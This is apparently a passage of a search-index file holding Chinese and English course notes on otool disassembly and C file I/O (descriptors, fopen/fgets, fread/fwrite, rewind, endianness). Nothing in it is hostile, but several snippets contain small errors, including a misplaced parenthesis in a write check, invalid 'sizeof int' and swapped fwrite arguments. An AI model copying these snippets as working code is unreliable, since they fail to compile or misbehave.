\u7a0b\u5e8f\u7684\u6bb5\u3001\u8282\u4fe1\u606f - \u53cd\u6c47\u7f16\u4ee3\u7801</p>"},{"location":"cs/c/4.1/#_5","title":"\u5e38\u7528\u9009\u9879","text":"<ul> <li><code>-t</code>\uff1a\u663e\u793a\u6587\u4ef6\u7684\u6587\u672c\u6bb5\uff0c\u5373\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\u3002\u8fd9\u4f1a\u663e\u793a\u6587\u4ef6\u7684\u53cd\u6c47\u7f16\u4ee3\u7801\u3002</li> <li><code>-v</code>\uff1a\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u3002</li> <li><code>-V</code>\uff1a\u540c\u65f6\u663e\u793a\u539f\u59cb\u5b57\u8282\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002</li> <li><code>| less</code>\uff1a\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c06\u8f93\u51fa\u901a\u8fc7 <code>less</code> \u5206\u9875\u663e\u793a\uff0c\u4fbf\u4e8e\u9010\u9875\u67e5\u770b\u957f\u8f93\u51fa\u5185\u5bb9\u3002</li> </ul>"},{"location":"cs/c/4.1/#_6","title":"\u793a\u4f8b\u89e3\u8bfb","text":"<p><pre><code>otool -tvV /bin/ls | less\n</code></pre> \u8fd9\u6761\u547d\u4ee4\u7684\u542b\u4e49\u662f\uff1a 1. \u4f7f\u7528 <code>otool</code> \u5bf9 <code>/bin/ls</code>\uff08ls \u547d\u4ee4\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff09\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u67e5\u770b\u5176\u4e2d\u7684\u673a\u5668\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002 2. \u901a\u8fc7 <code>-t</code> \u9009\u9879\uff0c\u63d0\u53d6\u5176\u6587\u672c\u6bb5\uff0c\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u3002 3. \u4f7f\u7528 <code>-v</code> \u548c <code>-V</code> \u9009\u9879\uff0c\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u5e76\u5305\u62ec\u539f\u59cb\u5b57\u8282\u7801\u548c\u5bf9\u5e94\u7684\u53cd\u6c47\u7f16\u6307\u4ee4\u3002 4. \u6700\u540e\u901a\u8fc7 <code>less</code> \u547d\u4ee4\u5206\u9875\u663e\u793a\u8f93\u51fa\u5185\u5bb9\uff0c\u65b9\u4fbf\u7528\u6237\u9605\u8bfb\u3002</p>"},{"location":"cs/c/4.1/#otool_1","title":"<code>otool</code> \u7684\u5e94\u7528\u573a\u666f","text":"<ul> <li>\u67e5\u770b Mach-O \u6587\u4ef6\u7684\u7ed3\u6784\uff1a\u5f00\u53d1\u8005\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u67e5\u770b macOS \u548c iOS \u5e94\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u6216\u76ee\u6807\u6587\u4ef6\u7684\u8be6\u7ec6\u7ed3\u6784\u4fe1\u606f\u3002</li> <li>\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\uff1a\u901a\u8fc7\u53cd\u6c47\u7f16\u548c\u67e5\u770b\u7b26\u53f7\u8868\uff0c<code>otool</code> \u662f\u8c03\u8bd5\u7a0b\u5e8f\u3001\u5206\u6790\u5e94\u7528\u884c\u4e3a\u3001\u9006\u5411\u5de5\u7a0b\u7b49\u7684\u5e38\u7528\u5de5\u5177\u3002</li> <li>\u4f9d\u8d56\u5206\u6790\uff1a\u5f00\u53d1\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u5206\u6790\u6587\u4ef6\u6240\u4f9d\u8d56\u7684\u52a8\u6001\u5e93\u548c\u5176\u4ed6\u5916\u90e8\u94fe\u63a5\u3002</li> </ul> <p>\u56e0\u6b64\uff0c<code>otool</code> \u662f macOS \u5f00\u53d1\u8005\u8fdb\u884c\u5e95\u5c42\u5206\u6790\u7684\u91cd\u8981\u5de5\u5177\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 <code>objdump</code> \u6216 <code>readelf</code>\u3002</p>"},{"location":"cs/c/4.2/","title":"4.2 I/O","text":""},{"location":"cs/c/4.2/#wed-lecture","title":"Wed Lecture","text":"<p>At the lowest level, an operating system will only communicate using bytes, not with higher-level integers or floating-point values. C11 employs arrays of characters to hold the bytes in requests for raw input and output.</p> <p>\u5728\u8bf7\u6c42\u539f\u59cb\u8f93\u5165\u548c\u8f93\u51fa\u65f6\uff0cC11 \u4f1a\u4f7f\u7528\u5b57\u7b26\u6570\u7ec4\u6765\u4fdd\u5b58\u8fd9\u4e9b\u8bf7\u6c42\u4e2d\u7684\u5b57\u8282\u3002\u64cd\u4f5c\u7cfb\u7edf\u53ea\u8ba4\u5b57\u8282\uff0c\u800c\u5b57\u7b26\u6570\u7ec4\u6b63\u662f\u5c06\u6570\u636e\u6253\u5305\u6210\u5b57\u8282\u7684\u5f62\u5f0f\uff0c\u56e0\u6b64\u5b57\u7b26\u6570\u7ec4\u5728\u8fd9\u91cc\u8d77\u5230\u5173\u952e\u4f5c\u7528\u3002</p>"},{"location":"cs/c/4.2/#file-descriptors","title":"File Descriptors","text":"<p>\u5728\u57fa\u4e8e Unix \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u7528\u4e8e\u6807\u8bc6\u5404\u79cd\u901a\u4fe1\u6e20\u9053\u7684\u6574\u6570\u503c\u3002\u8fd9\u4e9b\u6e20\u9053\u53ef\u4ee5\u662f\u6587\u4ef6\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7ba1\u9053\u3001\u8bbe\u5907\uff0c\u6216\u8005\u7f51\u7edc\u8fde\u63a5\u7b49\u3002\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f5c\u4e3a\u7b80\u5355\u7684\u6574\u6570\u503c\uff0c\u63d0\u4f9b\u4e86\u4e0e\u8fd9\u4e9b\u8d44\u6e90\u7684\u63a5\u53e3\u3002</p> <p>\u5728 C11 \u7f16\u7a0b\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u548c\u5b57\u7b26\u6570\u7ec4\u7ecf\u5e38\u7ec4\u5408\u4f7f\u7528\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u53d1\u51fa\u8f93\u5165\u8f93\u51fa\u8bf7\u6c42\u3002\u4ee5\u6587\u4ef6\u8bfb\u53d6\u4e3a\u4f8b\uff0c\u7a0b\u5e8f\u901a\u8fc7\u6574\u6570\u6587\u4ef6\u63cf\u8ff0\u7b26\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u8981\u8bbf\u95ee\u54ea\u4e2a\u6587\u4ef6\uff0c\u5e76\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u5b58\u5165\u5b57\u7b26\u6570\u7ec4\u4e2d\uff0c\u7cfb\u7edf read \u7ec6\u8282\u53ef\u4ee5\u53c2\u8003 <code>man 2 open</code></p> <p>\u4ee5\u4e0b\u4e3a\u8bfb\u53d6\u6587\u4ef6\u5168\u90e8\u5185\u5bb9\u5b8c\u6574\u4ee3\u7801\uff1a</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nvoid read_using_descriptor(char filename[])        \n{\n    // \u5c1d\u8bd5\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\n    int fd = open(filename, O_RDONLY);\n\n    // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u6210\u529f\u6253\u5f00\n    if(fd == -1) {\n        printf(\"cannot open '%s'\\n\", filename);\n        exit(EXIT_FAILURE);\n    }\n\n    // \u5b9a\u4e49\u5b57\u7b26\u6570\u7ec4\u7528\u4e8e\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\n    char buffer[MYSIZE];\n    size_t got;\n\n    // \u591a\u6b21\u8bfb\u53d6\u6587\u4ef6\u76f4\u5230\u6587\u4ef6\u672b\u5c3e\n    while((got = read(fd, buffer, sizeof buffer)) &gt; 0) {\n        write(STDOUT_FILENO, buffer, got);\n    }\n    // \u5f53 read \u51fd\u6570\u8fd4\u56de 0 \u65f6\uff0c\u8868\u793a\u5df2\u7ecf\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e\uff08EOF\uff09\uff0c\u6ca1\u6709\u66f4\u591a\u7684\u6570\u636e\u53ef\u4ee5\u8bfb\u53d6\u3002\u8fd9\u65f6\u5faa\u73af\u6761\u4ef6 got &gt; 0 \u4e0d\u518d\u6ee1\u8db3\uff0c\u5faa\u73af\u9000\u51fa\u3002\n      // \u5982\u679c read \u51fd\u6570\u8fd4\u56de\u8d1f\u503c\uff0c\u5219\u8868\u793a\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5faa\u73af\u4e5f\u4f1a\u9000\u51fa\u3002\n\n    // \u5173\u95ed\u6587\u4ef6\uff0c\u8868\u793a\u4e0d\u518d\u8bbf\u95ee\n    close(fd);\n}\n\nint main() {\n    read_using_descriptor(\"haversine.c\");\n}\n</code></pre> <p>\u5176\u4e2d <code>fcntl.h</code> \u4e3a\u5e95\u5c42\u63d0\u4f9b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u4e0d\u662f C11 \u7684\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u63d0\u4f9b\u4e86 <code>open</code>, <code>read</code>, <code>close</code> \u7b49\u8d1f\u8d23\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u4ea4\u4e92\u5e76\u6267\u884c\u4f4e\u5c42\u6b21\u7684\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u3002<code>unistd.h</code>\u63d0\u4f9b\u6807\u51c6\u6587\u4ef6\u5378\u8f7d\u51fd\u6570\u7684 close \u6389\u8c03\u7528\u901a\u9053\u540e\u91ca\u653e\u5185\u5b58 </p> <p><code>int fd = open(filename, O_RDONLY)</code> open and read only \u7684\u7f29\u5199\u53ea\u8bfb\uff1b\u5176\u6b21\u6253\u5f00\u6587\u4ef6\u53ef\u80fd\u4f1a\u9047\u5230\u51e0\u79cd\u60c5\u51b5\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728 ENOENT \u6587\u4ef6\u6ca1\u6709\u6743\u9650 EACCESS \u548c\u6587\u4ef6\u7cfb\u7edf\u8fbe\u5230\u6253\u5f00\u6587\u4ef6\u6570\u91cf\u7684\u4e0a\u9650 EMFILE \u6216 ENFILE</p> <p>\u7cfb\u7edf\u6210\u529f\u6253\u5f00\u6587\u4ef6\u540e\u4f1a\u8fd4\u56de\u6b63\u6574\u6570\uff0c\u4e00\u4e2a\u5927\u4e8e 3 \u7684\u503c\uff0c0 1 2 \u5206\u522b\u5c5e\u4e8e <code>stdin</code>, <code>stdout</code>, <code>stderr</code> \u7684\u6807\u51c6\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5f53\u6587\u4ef6\u6253\u5f00\u5931\u8d25\u65f6\uff0copen \u51fd\u6570\u4f1a\u8fd4\u56de -1 </p> <pre><code>if(fd == -1) {\n    printf(\"cannot open '%s'\\n\", filename);\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>EXIT_FAILURE \u662f\u4e00\u4e2a\u5b8f\uff0c\u5b9a\u4e49\u5728  \u4e2d\uff0c\u5b83\u8868\u793a\u7a0b\u5e8f\u7684\u5f02\u5e38\u9000\u51fa\u6216\u5931\u8d25\u72b6\u6001\u3002\u4f7f\u7528 EXIT_FAILURE \u53ef\u4ee5\u66f4\u52a0\u660e\u786e\u5730\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u7531\u4e8e\u67d0\u79cd\u9519\u8bef\u800c\u9000\u51fa\u3002\u4e0e\u4e4b\u76f8\u5bf9\u7684\u5b8f\u662f EXIT_SUCCESS\uff0c\u8868\u793a\u7a0b\u5e8f\u7684\u6b63\u5e38\u9000\u51fa\u3002 <p>\u4e0e Python \u4e0d\u540c\u7684\u662f C \u9700\u8981\u663e\u793a\u624b\u52a8\u7ba1\u7406\u5185\u5b58\uff0c\u56e0\u6b64\u5e95\u5c42\u7684\u7f13\u51b2\u548c\u5185\u5b58\u7ba1\u7406\u9700\u8981\u624b\u52a8\u7ba1\u7406\uff0c\u6570\u7ec4 buffer \u7684\u4f5c\u7528\u4e3a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\uff0c\u63d0\u9ad8\u6548\u7387\u5e76\u51cf\u5c11\u7cfb\u7edf\u8c03\u7528\u6b21\u6570\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u5185\u5b58\u5927\u5c0f\uff1a</p> <pre><code>char buffer[1024];\nint fd = open(\"file.txt\", O_RDONLY);\nint bytes_read = read(fd, buffer, sizeof(buffer));\n</code></pre> <p>size_t \u7c7b\u578b\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u7c7b\u578b\uff0c\u901a\u5e38\u7528\u4e8e\u63cf\u8ff0\u5185\u5b58\u6216\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5728 32 \u4f4d\u7cfb\u7edf\u4e0a\uff0csize_t \u901a\u5e38\u662f 4 \u5b57\u8282\u957f\uff0832 \u4f4d\uff09\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u5b83\u901a\u5e38\u662f 8 \u5b57\u8282\u957f\uff0864 \u4f4d\uff09\u3002\u56e0\u6b64\uff0c\u5b83\u8db3\u591f\u5927\uff0c\u80fd\u591f\u8868\u793a\u7cfb\u7edf\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u6700\u5927\u53ef\u80fd\u5927\u5c0f\u3002</p> <pre><code>printf(\"%lu\", got); //2185 \u4e2a\u8bfb\u53d6\u6587\u4ef6 read \u6d41\u5b57\u8282\u6570\n</code></pre> <p>USB \u548c\u7f51\u7edc\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b got \u8fd9\u79cd\u5bb9\u6613\u51fa\u9519</p>"},{"location":"cs/c/4.2/#copy-a-file-using-file-descriptors","title":"Copy a file using file descriptors","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nint copy_file(char destination[], char source[])        \n{\n//  ATTEMPT TO OPEN source FOR READ-ONLY ACCESS\n    int fd0    = open(source, O_RDONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd0 == -1) {\n        return -1;\n    }\n\n//  ATTEMPT TO OPEN destination FOR WRITE-ONLY ACCESS\n    int fd1    = open(destination, O_WRONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd1 == -1) {\n        close(fd0);\n        return -1;\n    }\n\n//  DEFINE A CHARACTER ARRAY TO HOLD THE FILE'S CONTENTS\n    char   buffer[MYSIZE];\n    size_t got;\n\n//  PERFORM MULTIPLE READs OF FILE UNTIL END-OF-FILE REACHED  \n    while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n        if(write(fd1, buffer, got)) != got) {  \n            close(fd0); close(fd1);\n            return -1;\n        }\n    }\n\n    close(fd0); close(fd1);\n    return 0;\n}\n</code></pre> <p>\u548c read \u4ee3\u7801\u524d\u671f\u64cd\u4f5c\u4e00\u81f4\uff0c\u9664\u4e86\u53cc open \u64cd\u4f5c\u5728 while \u5faa\u73af\u5904\uff1a</p> <p>\u8fd9\u91cc\u7684 while loop condition \u7684\u903b\u8f91\u662f\uff1awhile \u5faa\u73af\u4f1a\u4e0d\u65ad\u5730\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u5e76\u5199\u5165\u6807\u51c6\u8f93\u51fa\uff0c\u76f4\u5230\u8bfb\u53d6\u5230\u6587\u4ef6\u672b\u5c3e\uff08read \u8fd4\u56de 0\uff09\u6216\u53d1\u751f\u9519\u8bef\uff08read \u8fd4\u56de\u8d1f\u503c\uff09\u3002</p> <p>\u53ea\u8981\u6ee1\u8db3\u8fd9\u4e2a condition \u5c31\u7ee7\u7eed\u8fd0\u884c\uff0c\u4e0d\u6ee1\u8db3\u76f4\u63a5\u9000\u51fa</p> <pre><code>while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n    if(write(fd1, buffer, got)) != got) {  \n        close(fd0); close(fd1);\n        return -1;\n    }\n}\n</code></pre> <p>read(fd, buffer, sizeof buffer)\uff1a\u4ece\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u6700\u591a\u8bfb\u53d6 sizeof buffer \u5b57\u8282\u7684\u6570\u636e\uff0c\u5e76\u5c06\u8fd9\u4e9b\u6570\u636e\u5b58\u50a8\u5728 buffer \u4e2d\u3002\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u5b9e\u9645\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002write \u51fd\u6570\u5c1d\u8bd5\u5c06 buffer \u4e2d\u7684 got \u5b57\u8282\u6570\u636e\u5199\u5165\u5230 fd1 \u6307\u5b9a\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5b83\u8fd4\u56de\u5b9e\u9645\u5199\u5165\u7684\u5b57\u8282\u6570\u3002</p> <p>\u8fd9\u4e2a\u6761\u4ef6\u68c0\u67e5 write \u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u5426\u7b49\u4e8e got\u3002\u5982\u679c\u8fd4\u56de\u503c\u4e0d\u7b49\u4e8e got\uff0c\u8bf4\u660e\u5199\u5165\u64cd\u4f5c\u6ca1\u6709\u5b8c\u5168\u6210\u529f\uff08\u53ef\u80fd\u90e8\u5206\u6570\u636e\u6ca1\u6709\u5199\u5165\uff0c\u6216\u8005\u53d1\u751f\u4e86\u9519\u8bef\uff09\u3002</p>"},{"location":"cs/c/4.2/#read-and-writing-text-files","title":"Read and writing text files","text":"<p>\u8bfb\u53d6 txt \u548c\u8bfb\u53d6\uff0c\u5199\u5165 byte \u7684\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u662f\u8bfb\u53d6 txt \u4e00\u822c\u90fd\u662f\u4e00\u884c\u4e00\u884c\u7684\u8bfb\u53d6\uff0c\u4e0d\u662f\u7f51\u7edc\u5b57\u8282\u3002\u56e0\u6b64\u7528 std \u5e93\u91cc\u7684 fopen \u548c fclose \u51fd\u6570\u8fdb\u884c\u9ad8\u7ea7\u64cd\u4f5c\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define DICTIONARY      \"/usr/share/dict/words\"\n\n....\n//  ATTEMPT TO OPEN THE FILE FOR READ-ACCESS\n    FILE   *dict = fopen(DICTIONARY, \"r\");\n\n//  CHECK IF ANYTHING WENT WRONG\n    if(dict == NULL) {\n        printf( \"cannot open dictionary '%s'\\n\", DICTIONARY);\n        exit(EXIT_FAILURE);\n    }\n\n//  READ AND PROCESS THE CONTENTS OF THE FILE\n    ....\n\n//  WHEN WE'RE FINISHED, CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u4e0e Python \u4e00\u81f4</p> <p>r, r+, w, w+, a, a+</p> <pre><code>FILE   *dict = fopen(DICTIONARY, \"r\");\n</code></pre> <p>\u7528 FILE \u7c7b\u578b\u58f0\u660e\uff0c<code>*</code> \u8868\u660e dict \u662f\u4e00\u4e2a\u6307\u5411 FILE \u7c7b\u578b\u6570\u636e\u7684\u6307\u9488</p> <p>\u6709\u4e9b\u4ee3\u7801\u4e2d\u4f1a\u51fa\u73b0 br \u4e4b\u7c7b\u7684\u7528\u4e8c\u8fdb\u5236\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u8fd9\u79cd\u6807\u5fd7\u53ea\u4f1a\u5728 Windows \u6709\u6548\uff0c\u5176\u4ed6\u7cfb\u7edf\u4f1a\u88ab\u80e1\u54a7\uff0c\u4e3a\u4e0a\u4e2a\u4e16\u7eaa\u9057\u7559\u4e0b\u6765\u7684\u4e00\u4e9b\u8001\u6807\u51c6</p>"},{"location":"cs/c/4.2/#read-txt-line-by-line","title":"Read txt line by line","text":"<pre><code>#include &lt;stdio.h&gt;\n\n....\n    FILE   *dict;\n    char   line[BUFSIZ];\n\n    dict = fopen( ..... );\n    ....\n\n//  READ EACH LINE FROM THE FILE,\n//  CHECKING FOR END-OF-FILE OR AN ERROR\n    while( fgets(line, sizeof line, dict) != NULL ) {  \n        ....\n        ....     // process this line\n        ....\n    }\n//  AT END-OF-FILE (OR AN ERROR), CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u4ece\u68c0\u67e5\u6574\u4f53\u5230\u4e00\u884c\u884c\u68c0\u67e5\uff1a</p> <p>\u7ed3\u679c\u53d1\u73b0\u8bfb\u53d6\u7684\u6bcf\u4e00\u884c\u5b9e\u9645\u4e0a\u7ed3\u5c3e\u90fd\u4f1a\u6709 <code>\\n\\0</code>, \u5728 Windows \u7cfb\u7edf\u4e0a\u751a\u81f3\u8fd8\u591a\u4e00\u4e2a\u56de\u8f66\u7b26\uff1a<code>\\r\\n\\0</code> \u56e0\u6b64\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u5c06\u5176\u66ff\u6362\u4e3a null byte</p> <pre><code>// REMOVE ANY TRAILING end-of-line CHARACTERS FROM THE LINE\nvoid trim_line(char line[])\n{\n    int i = 0;\n\n//  LOOP UNTIL WE REACH THE END OF line\n    while(line[i] != '\\0') {\n\n//  CHECK FOR CARRIAGE-RETURN OR NEWLINE\n        if( line[i] == '\\r' || line[i] == '\\n' ) {\n            line[i] = '\\0'; // overwrite with null-byte\n            break;          // leave the loop early\n        }\n        i = i+1;            // iterate through character array\n    }\n}\n</code></pre> <p>\u4f46\u662f\u8fd9\u6837\u7684\u64cd\u4f5c\u662f\u5bf9 variable \u7684\u526f\u672c\u8fdb\u884c\u7f16\u8f91</p>"},{"location":"cs/c/4.2/#writing-text-output-to-a-file","title":"Writing text output to a file","text":"<p><code>fgets()</code> \u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u4e00\u884c\u6587\u672c\uff0c\u7528 <code>fputs</code> \u5199\u5165\u4e00\u884c\u6587\u672c</p> <p><code>fputs</code> \u7684\u6587\u4ef6\u6307\u9488\u5fc5\u987b\u63d0\u524d\u5df2\u7ecf <code>open</code> for writing \u6216 appending </p>"},{"location":"cs/c/4.2/#copy-a-text-file-using-file-pointers","title":"Copy a text file using file pointers","text":"<p>\u4ee5\u4e0b\u5c31\u662f\u5e26\u6709\u5168\u90e8\u5b8c\u6574\u6b63\u5e38\u529f\u80fd\u7684\u5168\u90e8\u7a0b\u5e8f\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copy_text_file(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"r\");\n    FILE        *fp_out  = fopen(destination,  \"w\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n        char    line[BUFSIZ];\n\n        while( fgets(line, sizeof line, fp_in) != NULL) {  \n            if(fputs(line, fp_out) == EOF) {\n                printf(\"error copying file\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n    }\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u7531\u4e8e <code>fputs</code> \u6709 return \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728 if \u8fc7\u7a0b\u4e2d\u5c31\u5df2\u7ecf\u5199\u5165\u8fdb out \u6307\u9488</p>"},{"location":"cs/c/4.2/#reading-and-writing-files-of-binary-data","title":"Reading and writing files of binary data","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copyfile(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"rb\");\n    FILE        *fp_out  = fopen(destination,  \"wb\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n\n        char    buffer[BUFSIZ];\n        size_t  got, wrote;\n\n        while( (got = fread(buffer, 1, sizeof buffer, fp_in)) &gt; 0) {  \n            wrote = fwrite(buffer, 1, got, fp_out);\n            if(wrote != got) {\n                printf(\"error copying files\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n\n    }\n\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u540e\u52a0\u5165 b \u7136\u540e\u6309\u7167 1 \u5b57\u8282 1 \u5b57\u8282\u7684\u5927\u5c0f\u64cd\u4f5c\u590d\u5236\uff0c\u4e00\u822c\u7528\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u534f\u8bae\u89e3\u5305\uff0c\u8ba9\u6570\u636e\u9879\u5927\u5c0f\u76f8\u540c</p> <pre><code>size_t  fread(void *ptr, size_t eachsize, size_t nelem, FILE *stream);\n</code></pre>"},{"location":"cs/c/4.2/#tape","title":"Tape","text":"<p>Professor \u63d0\u51fa\u4e86\u78c1\u5e26\u64e6\u51fa\u5f55\u5236\u7684\u6982\u5ff5\uff0c\u7528\u5230\u4e86 rewind \u51fd\u6570\u8986\u5199\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint   intarray[ N_ELEMENTS ];\nint   got, wrote;\n\n//  OPEN THE BINARY FILE FOR READING AND WRITING\n    FILE  *fp = fopen(filename, \"rb+\");\n    ....\n\n    got = fread( intarray, sizeof int, N_ELEMENTS, fp);  \n    printf(\"just read in %i ints\\n\", got);\n\n//  MODIFY THE BINARY DATA IN THE ARRAY\n    ....\n\n//  REWIND THE FILE TO ITS BEGINNING\n    rewind(fp);\n\n//  AND NOW OVER-WRITE THE BEGINNING DATA\n    wrote = fwrite( intarray, sizeof int, N_ELEMENTS, fp);  \n    ....\n\n    fclose(fp);\n</code></pre> <p>rewind \u51fd\u6570\u5c06\u7ed9\u5b9a\u7684\u6587\u4ef6\u6d41 stream \u7684\u6587\u4ef6\u4f4d\u7f6e\u6307\u9488\u91cd\u7f6e\u5230\u6587\u4ef6\u7684\u5f00\u5934\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u540e\u7eed\u7684\u6587\u4ef6\u8bfb\u5199\u64cd\u4f5c\u5c06\u4ece\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u3002</p>"},{"location":"cs/c/4.2/#network","title":"Network","text":"<p>\u5728\u4e0d\u540c\u7684\u786c\u4ef6\u67b6\u6784\u4e0b\u5199\u5165\u548c\u8bfb\u53d6\u51fa\u6765\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7ed3\u679c\u4e0d\u4e00\u6837\uff0c\u8fd9\u4e2a\u95ee\u9898\u5728\u5f80\u8fd4\u4e0d\u540c\u67b6\u6784\u548c\u8de8\u7f51\u7edc\u7684\u65f6\u5019\u9700\u8981\u88ab\u89e3\u51b3\uff0c\u8be6\u7ec6\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u8bfe\u7a0b\u4e2d\u7684\u6570\u636e\u7684\u7ec8\u7ed3\u6027</p> <p>32 \u5954\u817e\u5904\u7406\u5668</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfor(int n=0 ; n &lt; N ; ++n) {\n    array[n]  =  n;\n}\n\nfwrite(array, N, sizeof int, fp_out);\n</code></pre> <p>32 PowerPC \u8bfb\u53d6</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfread(array, N, sizeof int, fp_in);  \n\nfor(int n=0 ; n &lt; N ; ++n) {\n    printf(\"%i \", array[n]);\n}\nprintf(\"\\n\");\n</code></pre>"},{"location":"cs/c/4.3/","title":"4.3 I/O Prac","text":""},{"location":"cs/c/4.3/#workshop","title":"Workshop","text":"<p>\u5728\u8fd9\u4e2a\u7814\u8ba8\u4f1a\u4e2d\uff0c\u4f60\u5c06\u5b66\u4e60\u5982\u4f55\u6d4b\u91cf\u8bfb\u53d6\u6587\u4ef6\u6240\u9700\u7684\u65f6\u95f4\uff0c\u5305\u62ec\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u95f4\u548c\u4e0d\u540c\u5927\u5c0f\u8f93\u5165\u7f13\u51b2\u533a\u7684\u8bfb\u5199\u65f6\u95f4\u3002\u9996\u5148\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u5f88\u5927\u7684\u6587\u4ef6\u4ee5\u4fbf\u8fdb\u884c\u6d4b\u8bd5\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u5927\u7ea61GB\u7684\u6587\u4ef6\uff1a</p> <pre><code>for i in {1..1000} ; do cat /bin/bash &gt;&gt; /tmp/huge ; done\n</code></pre> <p>\u4f60\u7684\u7a0b\u5e8f\u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff1a</p> <ul> <li> 